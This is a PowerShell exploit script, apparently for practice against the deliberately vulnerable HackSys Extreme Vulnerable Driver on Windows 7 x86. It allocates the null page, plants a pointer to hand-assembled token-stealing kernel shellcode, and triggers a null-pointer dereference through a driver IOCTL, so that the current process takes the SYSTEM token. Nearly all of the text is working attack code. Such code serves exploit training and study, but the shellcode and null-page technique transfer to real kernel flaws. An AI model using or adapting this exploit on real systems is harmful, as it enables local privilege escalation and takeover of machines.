Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

public static class EVD
{
	[DllImport("ntdll.dll")]
	public static extern uint NtAllocateVirtualMemory(
		IntPtr ProcessHandle,
		ref IntPtr BaseAddress,
		uint ZeroBits,
		ref UInt32 AllocationSize,
		UInt32 AllocationType,
		UInt32 Protect);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern IntPtr VirtualAlloc(
		IntPtr lpAddress,
		uint dwSize,
		UInt32 flAllocationType,
		UInt32 flProtect);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern IntPtr CreateFile(
		String lpFileName,
		UInt32 dwDesiredAccess,
		UInt32 dwShareMode,
		IntPtr lpSecurityAttributes,
		UInt32 dwCreationDisposition,
		UInt32 dwFlagsAndAttributes,
		IntPtr hTemplateFile);

	[DllImport("Kernel32.dll", SetLastError = true)]
	public static extern bool DeviceIoControl(
		IntPtr hDevice,
		int IoControlCode,
		byte[] InBuffer,
		int nInBufferSize,
		byte[] OutBuffer,
		int nOutBufferSize,
		ref int pBytesReturned,
		IntPtr Overlapped);

	[DllImport("kernel32.dll")]
	public static extern uint GetLastError();
}
"@

# Compiled with Keystone-Engine
# Hardcoded offsets for Win7 x86 SP1
$Shellcode = [Byte[]] @(
	#---[Setup]
	0x60,                               # pushad
	0x64, 0xA1, 0x24, 0x01, 0x00, 0x00, # mov eax, fs:[KTHREAD_OFFSET]
	0x8B, 0x40, 0x50,                   # mov eax, [eax + EPROCESS_OFFSET]
	0x89, 0xC1,                         # mov ecx, eax (Current _EPROCESS structure)
	0x8B, 0x98, 0xF8, 0x00, 0x00, 0x00, # mov ebx, [eax + TOKEN_OFFSET]
	#---[Copy System PID token]
	0xBA, 0x04, 0x00, 0x00, 0x00,       # mov edx, 4 (SYSTEM PID)
	0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00, # mov eax, [eax + FLINK_OFFSET] <-|
	0x2D, 0xB8, 0x00, 0x00, 0x00,       # sub eax, FLINK_OFFSET           |
	0x39, 0x90, 0xB4, 0x00, 0x00, 0x00, # cmp [eax + PID_OFFSET], edx     |
	0x75, 0xED,                         # jnz                           ->|
	0x8B, 0x90, 0xF8, 0x00, 0x00, 0x00, # mov edx, [eax + TOKEN_OFFSET]
	0x89, 0x91, 0xF8, 0x00, 0x00, 0x00, # mov [ecx + TOKEN_OFFSET], edx
	#---[Recover]
	0x61,                               # popad
	0xC3                                # ret
)

# Write shellcode to memory
echo "`n[>] Allocating ring0 payload.."
[IntPtr]$Pointer = [EVD]::VirtualAlloc([System.IntPtr]::Zero, $Shellcode.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $Pointer, $Shellcode.Length)
$ShellcodePointer = [System.BitConverter]::GetBytes($Pointer.ToInt32())
echo "[+] Payload size: $($Shellcode.Length)"
echo "[+] Payload address: 0x$("{0:X8}" -f $Pointer.ToInt32())"

# Allocate null-page
#---
# NtAllocateVirtualMemory must be used as VirtualAlloc
# will refuse a base address smaller than [IntPtr]0x1000
#---
echo "`n[>] Allocating process null page.."
[IntPtr]$ProcHandle = (Get-Process -Id ([System.Diagnostics.Process]::GetCurrentProcess().Id)).Handle
[IntPtr]$BaseAddress = 0x1 # Rounded down to 0x00000000
[UInt32]$AllocationSize = 2048 # 2kb, seems like a nice number
$CallResult = [EVD]::NtAllocateVirtualMemory($ProcHandle, [ref]$BaseAddress, 0, [ref]$AllocationSize, 0x3000, 0x40)
if ($CallResult -ne 0) {
	echo "[!] Failed to allocate null-page..`n"
	Return
} else {
	echo "[+] Success"
}
echo "[+] Writing shellcode pointer to 0x00000004"
[System.Runtime.InteropServices.Marshal]::Copy($ShellcodePointer, 0, [IntPtr]0x4, $ShellcodePointer.Length)

# Get handle to driver
$hDevice = [EVD]::CreateFile("\\.\HacksysExtremeVulnerableDriver", [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)

if ($hDevice -eq -1) {
	echo "`n[!] Unable to get driver handle..`n"
	Return
} else {
	echo "`n[>] Driver information.."
	echo "[+] lpFileName: \\.\HacksysExtremeVulnerableDriver"
	echo "[+] Handle: $hDevice"
}

#---
# To trigger the null-pointer dereference all we need to do
# is pass the compare at HackSysExtremeVulnerableDriver+0x4b61.
# As long as our magic value is not 0xbad0b0b0, we're good!
#---
$Buffer = [System.BitConverter]::GetBytes(0xdeadb33f) # Whatever value here..
echo "`n[>] Sending buffer.."
echo "[+] Buffer length: $($Buffer.Length)"
echo "[+] IOCTL: 0x22202B`n"
[EVD]::DeviceIoControl($hDevice, 0x22202B, $Buffer, $Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero) |Out-null